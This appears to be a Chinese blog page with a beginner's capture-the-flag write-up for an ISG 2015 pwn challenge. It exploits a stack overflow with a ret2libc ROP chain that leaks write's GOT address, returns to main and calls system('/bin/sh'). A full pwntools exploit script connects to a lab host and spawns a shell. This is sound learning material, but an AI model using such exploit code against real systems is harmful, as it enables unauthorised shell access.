@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="ruozhi">
+    
+    <meta name="description" content="Nothing...">
+    
+    
+    
+    
+    
+    
+    <title>一道简单的 PWN 题 | ruozhi</title>
+    <link href=”https://liey1.github.io“ rel=”prefetch” />
+
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+</head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <div class="gal-menu gal-dropdown">
+    <div class="circle" id="gal">
+        <div class="ring">
+            <a href="https://liey1.github.io" class="menuItem" style="left: 50%; top: 15%;">首页</a>
+            
+            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
+            
+            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
+            <a href="/plan" class="menuItem" style="left: 50%; top: 85%;">计划</a>
+            <a href="/essays" class="menuItem" style="left: 19.6891%; top: 67.5%;">随笔</a>
+            
+            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
+            
+        </div>
+        <audio id="audio" src="/imgs/oni.mp3"></audio>
+    </div>
+</div>
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://liey1.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">ruozhi</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/collections">
+                        <i class="fa fa-list"></i>收藏
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://liey1.github.io">ruozhi</a>
+        >
+        <span>一道简单的 PWN 题</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2018/09/11/一道简单的 PWN 题/">一道简单的 PWN 题</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-09-11
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2018/09/11/一道简单的 PWN 题/">一道简单的 PWN 题</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-09-11
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>这道貌似是 ISG 2015 年的题了。。</p>
+<h4 id="本题WP"><a href="#本题WP" class="headerlink" title="本题WP"></a><a href="https://blog.csdn.net/csalp/article/details/49956179" target="_blank" rel="noopener">本题WP</a></h4><hr>
+<p>问题：</p>
+<p>跟着栈溢出，将 <code>EIP</code> 覆盖成 write 函数的 <code>plt</code> 值，紧接着 <code>read</code> 的 <code>plt</code> 值，这里让我不解的是：</p>
+<p>为什么 <code>read</code> 的函数被执行了。猜测应该是 <code>write</code> 函数中自带了 <code>ret</code> 指令。明天争取学会用 <code>gdb</code> 调试进 <code>write</code> 函数中吧。</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/11/6f86787e404d258e803864226710110b.png" alt="跟着塔主学PWN_1"></p>
+<hr>
+<p>  接上。。尝试用 <code>gdb</code> 进入 <code>write</code> 函数。但是：</p>
+<p>  <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/637ed82540b56bdf80bfce25de0d6fa9.png" alt="跟着塔主学PWN_1"></p>
+<p>  问了表哥后，表哥来了个姿势：先运行，在输入的时候按 <code>CTRL+C</code> （之前确实没学过 <code>gdb</code> ）</p>
+<p> 但是这里，可以整个更直接的：<code>b write</code></p>
+<blockquote>
+<p>运行&gt;</p>
+</blockquote>
+<p> 进入到 <code>write</code> 函数内，首先看看怎么取参数：</p>
+<p> <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/b5e1013340d283a4807f40f5a4ae1930.png" alt="跟着塔主学PWN_2"></p>
+<p> 等会再讲。。</p>
+<p> 再看看最后，发现确实用的 <code>ret</code>（废话，不用 <code>ret</code> 怎么返回）</p>
+<p> <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/7b9cebf440d477cf80aabfd4e5f027ac.png" alt="跟着塔主学PWN_3"></p>
+<hr>
+<blockquote>
+<p>切入这道题。。。</p>
+</blockquote>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><hr>
+<blockquote>
+<p>首先丢进 <code>ida</code> 里看看</p>
+</blockquote>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/28e6acc54052fee98034609d2c195954.png" alt="跟着塔主学PWN_4"></p>
+<p>很明显的一个缓冲区溢出。。（我也只会缓冲区溢出了）</p>
+<p>这里写的 变量 <code>v1</code> 离 <code>ebp</code> 为 <code>0xC(12)</code> 个位置，但是实际测试为 <code>0x10(16)</code> 个位置。</p>
+<p>这里玩个好玩的。。我们可以用 <code>gdb_pattern</code> 生成一些字符串，发送出去后查看 <code>EIP</code>。将此时的 EIP 记录下来再用 <code>gdb_offset</code> 查看偏移位置，这就是变量离 <code>EIP</code> 的位置了：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/cbd6e6064087ae7a807b1e052d714dcc.png" alt="跟着塔主学PWN_5"></p>
+<p>现在我们知道是离 20 个位置。我们可以先溢出玩玩，这里 <code>checksec</code> 发现开启了 <code>NX</code> 。我们可以先用 <code>write</code> 函数试试水。比如就打印 <code>ida</code> 代码中 第 <code>6</code> 行的 <code>write(1, &quot;Welcome to ISG 2015!\nPwn me to get the flag:\n&quot;, 0x2Du);</code></p>
+<p>在 <code>ida</code> 中看看 <code>plt</code> 的 <code>write</code> 地址：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/cd856871401be1558081881ce8cb5aed.png" alt="跟着塔主学PWN_6"></p>
+<p>再在 <code>qira</code> 中看看 <code>welcome to isg..</code> 这段字符串在哪：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/f92b00cc4035903880a75c1c61781027.png" alt="跟着塔主学PWN_7"></p>
+<p>因为之前调用的 <code>write</code> 函数就是输出这段字符串，所以这个地址就是那段字符串的地址咯。。</p>
+<blockquote>
+<p>整理一下：</p>
+</blockquote>
+<p>初始栈的结构：</p>
+<table>
+<thead>
+<tr>
+<th>相对地址</th>
+<th>对应值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0</td>
+<td>变量 v1</td>
+</tr>
+<tr>
+<td>0x4</td>
+<td>…</td>
+</tr>
+<tr>
+<td>0x8</td>
+<td>…</td>
+</tr>
+<tr>
+<td>0x12</td>
+<td>…</td>
+</tr>
+<tr>
+<td>0x16</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0x20</td>
+<td>EIP</td>
+</tr>
+</tbody>
+</table>
+<p>所以这里填充 <code>20</code> 位任意字符。再用 <code>write</code> 函数的 <code>plt</code> 地址覆盖 <code>EIP</code>。</p>
+<p>POC 如下：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/d2d4ff8440f9788d80e527c641063ff6.png" alt="跟着塔主学PWN_8"></p>
+<p>看看 <code>qira</code> 中：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/9f2c319440cb484480a6294b4d208178.png" alt="跟着塔主学PWN_9"></p>
+<p>看到 write 函数执行了，但是我们没给参数，所以他取到了栈里的默认值，而中间的参数是最明显的，所以我们看看中间的参数位置是多少，方便覆盖。位置是：<code>0xf6fff018</code> ，此时栈顶的地址： <code>0xf6fff008</code> 。</p>
+<p>回到一开始。。在 <code>write</code> 函数的截图中，发现取得参数位置分别是：<code>esp+0x8</code>, <code>esp+0xC</code>,<code>esp+0x10</code>。在取参数之前还有个 <code>push</code> 操作（在 <code>write</code> 函数中，上面的截图有。。），所以取参数得实际位置 <code>+4</code>。所以分别为： <code>esp+0x8</code>，<code>esp+0x10</code>,<code>esp+14</code> 。</p>
+<p>再看个明显点的例子：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/b87ed1aa409520af80e71538c2f30041.png" alt="跟着塔主学PWN_10"></p>
+<p>这里尝试控制参数。。</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/9dd7510c40f3350580acd09dd69ca037.png" alt="跟着塔主学PWN_11"></p>
+<p>简单的加法：<code>0x8+0x14 = 0x1C</code></p>
+<hr>
+<blockquote>
+<p>函数调用</p>
+</blockquote>
+<p>ok，别忘了一开始要做的事情，就是再调用一次 <code>write</code> 函数，输出一次 <code>Welcome...</code> 那个字符串。</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/146c078840f88fbc80b5db442a028314.png" alt="跟着塔主学PWN_12"></p>
+<hr>
+<blockquote>
+<p>找基地址</p>
+</blockquote>
+<p>我们可以直接去 <code>GOT</code> 表找 <code>write</code> 函数的地址：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/f4f94db140d1e4e8805b5fde92dabdb1.png" alt="跟着塔主学PWN_13"></p>
+<p>在 <code>GOT</code> 表中找到了 <code>write</code> 函数：<code>0x804a01c</code>。</p>
+<p>改一下 <code>ROP</code> 链，将 <code>write</code> 的实际函数地址打印出来：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/e48331a14064f6d680f358192a29421b.png" alt="跟着塔主学PWN_14"></p>
+<p>可以看到输出了正确的地址。代码中上面的 <code>r.recv</code> 是用来接收一开始输出的那段 <code>welcome...</code>，但是没必要输出（ 不接收的话下面 <code>recv</code> 还是会先接收到这个字符串 ）。</p>
+<blockquote>
+<p>获取 <code>system</code> 地址和 <code>/bin/sh</code> 字符串</p>
+</blockquote>
+<p>通过 <code>ldd</code> 看看这个 <code>二进制</code> 文件用了什么链接库..</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# ldd pwnme</span><br><span class="line">	linux-gate.so.1 =&gt;  (0xf77bc000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000)</span><br><span class="line">	/lib/ld-linux.so.2 (0x565e8000)</span><br></pre></td></tr></table></figure>
+<p><code>/lib32/libc.so.6</code> 中有我们想要的，首先是 获取 write 函数的偏移地址，这样就能获取到基地址了，可以用 <code>readelf</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# readelf -a  /lib32/libc.so.6|grep write@</span><br><span class="line">   .....</span><br><span class="line">  2303: 000d9900   119 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p>记下来，偏移地址 <code>0xd9900</code>。</p>
+<p>接下是 <code>system</code> 函数偏移地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# readelf -a  /lib32/libc.so.6|grep system@</span><br><span class="line">  ...</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p><code>system</code> 偏移地址是 <code>0x3fe70</code>。。接下来是 <code>/bin/sh</code> ，这个字符串用来传进 <code>system</code> 函数以便获取 <code>shell</code>，这里我们用 <code>ROPgadget</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# ROPgadget --binary  /lib32/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015da8c : /bin/sh</span><br></pre></td></tr></table></figure>
+<hr>
+<blockquote>
+<p>再发送</p>
+</blockquote>
+<p>接下来思考一个问题，就是纵使在发送完一次 <code>shellcode</code> 只会知道了 <code>基地址</code>。但是我们却不能再调用了。。。</p>
+<p>在最前面提到过。<code>write</code> 函数会调用 <code>ret</code>。可以把这个理解成 <code>pop eip</code>。也就是在栈顶中取出 <code>eip</code>。。。那么栈顶是哪呢？</p>
+<p>就是在 <code>write</code> 后以及所有参数的最前面。前面我用 <code>0x61616161</code> 替代了。。</p>
+<p>但是又会遇到一个问题。。就是即使直接调用了 <code>system</code> 函数，函数内取参数是取的 <code>esp+0x8</code>，但是 <code>esp+0x8</code> 这个位置被 <code>write</code> 函数的 <code>0xC</code> 占用了。。</p>
+<p>想一下是那个函数写进这段 <code>shellcode</code> 的。对，<code>main</code> 函数，我们可以调用会 <code>main</code> 函数，再调用一次 <code>shellcode</code>，只不过这次是调用 <code>system</code> 函数，而不是 <code>write</code> 函数。</p>
+<p>(<code>main</code> 函数的位置再 <code>ida</code> 中可以找到)</p>
+<p>完整的POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;192.168.1.107&quot;,4000)</span><br><span class="line"></span><br><span class="line">write_plt=0x08048370</span><br><span class="line">main=0x804847d</span><br><span class="line">print(r.recv())</span><br><span class="line"></span><br><span class="line">poc_rop1=[</span><br><span class="line">        write_plt,</span><br><span class="line">        main,</span><br><span class="line">        0x1,</span><br><span class="line">        0x804a01c,</span><br><span class="line">        4,</span><br><span class="line">]</span><br><span class="line">shellcode=&quot;a&quot;*20 + flat(poc_rop1)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">write_offset = 0xd9900</span><br><span class="line">system_offset =0x3fe70</span><br><span class="line"></span><br><span class="line">bin_bash = 0x0015da8c</span><br><span class="line"></span><br><span class="line">base = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base=int(base,16)-write_offset</span><br><span class="line"></span><br><span class="line">system = base + system_offset</span><br><span class="line">bin_str = base + bin_bash</span><br><span class="line"></span><br><span class="line">poc_rop2 = [</span><br><span class="line">        system,</span><br><span class="line">        0x61626364,</span><br><span class="line">        bin_str,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>需要注意的是第二次只需要填充 <code>12</code> 个 字符即可。。</p>
+<p>效果：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/74e7080840f68cf580279c597ba60bbf.png" alt="跟着塔主学PWN_15"></p>
+<hr>
+<h3 id="Done…"><a href="#Done…" class="headerlink" title="Done…."></a>Done….</h3>
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            ruozhi
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>Nothing…</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/11/一道简单的 PWN 题/">一道简单的 PWN 题</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/09/蓝鲸笔记管理系统/">蓝鲸笔记管理系统（塔主nb）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/09/蓝鲸文件管理系统/">蓝鲸文件管理系统（塔主nb）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/09/hello-world/">Nothing。。。</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                
+                <li class="">
+                    <a href="/2018/09/11/一道简单的 PWN 题/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                </li>
+                <li class="">
+                    <a href="/2018/09/11/一道简单的 PWN 题/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://hl0rey.github.io" target="_blank">hl0rey</a>
+    </li>
+    
+    <li>
+        <a href="https://yuyue123am.github.io/" target="_blank">小铭同学</a>
+    </li>
+    
+    <li>
+        <a href="http://www.mzxh.xyz/" target="_blank">墨竹星海</a>
+    </li>
+    
+    <li>
+        <a href="https://zzzzxycc.github.io/" target="_blank">zzzzxycc</a>
+    </li>
+    
+    <li>
+        <a href="https://damit5.com" target="_blank">damit5</a>
+    </li>
+    
+    <li>
+        <a href="http://blog.yanqin.net.cn/" target="_blank">燕青</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://www.baidu.com" target="_blank">百度</a>
+    </li>
+    
+    <li>
+        <a href="https://github.com" target="_blank">github</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com" target="_blank">知乎</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 ruozhi Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+<script src="/js/oni.js"></script>
+
+
+
+</html>
